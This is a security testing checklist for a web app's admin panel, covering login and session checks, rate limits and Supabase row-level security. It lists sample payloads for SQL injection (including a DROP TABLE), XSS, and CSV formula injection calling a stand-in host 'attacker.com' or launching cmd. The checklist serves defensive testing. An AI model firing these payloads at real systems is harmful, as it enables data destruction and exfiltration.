# Security Checklist

## Admin Auth Tests

1. Open `/admin` without logging in.
   - Expected: no list data is loaded and admin actions are disabled.
2. Submit a wrong password several times.
   - Expected: `401`, then `429` after repeated failures.
3. Submit the correct `ADMIN_PASSWORD`.
   - Expected: HttpOnly session cookie is set and list data loads.
4. Click logout, then call an admin API.
   - Expected: `401`.
5. Wait longer than the session max age.
   - Expected: admin API returns `401`.

## SQL Injection Input Tests

Use these as search keywords and admin text inputs:

```txt
' OR '1'='1
연차'; DROP TABLE admin_interpretations;--
1 OR 1=1
```

Expected: no server error, no data mutation, normal escaped text handling.

## XSS Input Tests

Use these in search, admin fields, CSV title, CSV answer, source URL:

```txt
<script>alert(1)</script>
<img src=x onerror=alert(1)>
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

Expected: text is rendered as inert text or stripped; URL fields reject non-http(s).

## CSV Formula Injection Tests

Use these CSV cell values:

```txt
=IMPORTXML("http://attacker.com","//a")
=HYPERLINK("http://attacker.com","click")
+cmd|' /C calc'!A0
@SUM(1+1)
```

Expected: saved values are prefixed safely and not interpreted as spreadsheet formulas.

## Rate Limit Tests

1. Call `/api/search` more than 60 times in 1 minute from the same IP.
2. Fail `/api/admin/login` more than 5 times in 15 minutes from the same IP.
3. Call `/api/admin-interpretations/upload-csv` more than 3 times in 10 minutes.

Expected:

```json
{
  "message": "요청이 너무 많습니다. 잠시 후 다시 시도해주세요.",
  "code": "RATE_LIMITED"
}
```

## Supabase RLS Example

If `admin_interpretations` is moved to Supabase, keep writes behind server API routes and enable RLS.

```sql
ALTER TABLE admin_interpretations ENABLE ROW LEVEL SECURITY;

CREATE POLICY "read admin interpretations"
ON admin_interpretations
FOR SELECT
USING (true);

CREATE POLICY "deny public inserts"
ON admin_interpretations
FOR INSERT
WITH CHECK (false);

CREATE POLICY "deny public updates"
ON admin_interpretations
FOR UPDATE
USING (false)
WITH CHECK (false);

CREATE POLICY "deny public deletes"
ON admin_interpretations
FOR DELETE
USING (false);
```

Use the service role key only in server-side API routes. Never expose it with a `NEXT_PUBLIC_` prefix.
